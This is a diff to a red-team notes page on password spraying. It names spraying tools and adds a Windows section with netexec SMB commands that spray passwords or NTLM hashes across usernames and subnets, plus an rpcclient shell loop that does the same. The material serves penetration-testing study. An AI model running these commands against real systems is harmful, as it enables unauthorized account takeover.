@@ -5,16 +5,48 @@
 
 <div class="row row-cols-lg-2"><div>
 
-Password spraying is a technique which is the most commonly used nowadays to find a working username+password.
+Password spraying is a technique that is the most commonly used nowadays to find a working credential pair.
 
-Instead of trying brute force with one username, and a list of passwords, we try **one password** with a list of usernames. 🤖
+We select a password and test it on a list of usernames. After a delay, we repeat this step with another password. 🤖
 
-One advantage is that we will most likely not get locked as we test different accounts.
+Many companies have some [password policy](policy.md) that may include account lookout after a certain number of failed attempts, which makes brute force impractical as we would lock all accounts.
 </div><div>
+
+Some tools you might use:
 
 * [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) <small>(1.4k ⭐, 2022 🪦)</small>
 * [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray) <small>(0.9k ⭐)</small>
 * [CredMaster](https://github.com/knavesec/CredMaster) <small>(0.8k ⭐)</small>
 
-Many [network authentication tools](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md) can be used too.
+Many [network authentication tools](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md) can be used such as `hydra -C`.
+</div></div>
+
+<hr class="sep-both">
+
+## Windows Credentials Password spraying
+
+<div class="row row-cols-lg-2"><div>
+
+#### Leveraging SMB
+
+[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+You can use [SMB](/operating-systems/networking/protocols/smb.md):
+
+```ps
+$ nxc smb IP -u wordlist -p PasswordHere
+$ nxc smb IP -u wordlist -p PasswordHere | grep +
+$ nxc smb --local-auth CIDR -u administrator -H hash | grep +
+```
+
+#### Leveraging RPC
+
+[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+A very poor but straightforward [RPC](/operating-systems/networking/protocols/rpc.md) password spraying:
+
+```ps
+$ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;quit" IP | grep Authority; done
+```
+</div><div>
 </div></div>
